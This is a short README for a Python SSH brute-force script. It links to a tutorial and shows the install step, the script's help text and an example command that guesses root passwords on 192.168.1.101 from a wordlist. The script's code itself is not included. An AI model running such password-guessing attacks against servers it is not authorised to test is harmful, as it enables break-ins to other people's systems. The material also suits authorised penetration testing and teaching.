# [How to Brute-Force SSH Servers in Python](https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python)
To run this:
- `pip3 install -r requirements.txt`
- 
    ```
    python bruteforce_ssh.py --help
    ```
    **Outputs:**
    ```
    usage: bruteforce_ssh.py [-h] [-P PASSLIST] [-u USER] host

    SSH Bruteforce Python script.

    positional arguments:
    host                  Hostname or IP Address of SSH Server to bruteforce.

    optional arguments:
    -h, --help            show this help message and exit
    -P PASSLIST, --passlist PASSLIST
                            File that contain password list in each line.
    -u USER, --user USER  Host username.
    ```
- If you want to bruteforce against the server `192.168.1.101` for example, the user `root` and a password list of `wordlist.txt`:
    ```
    python bruteforce_ssh.py 192.168.1.101 -u root -P wordlist.txt
    ```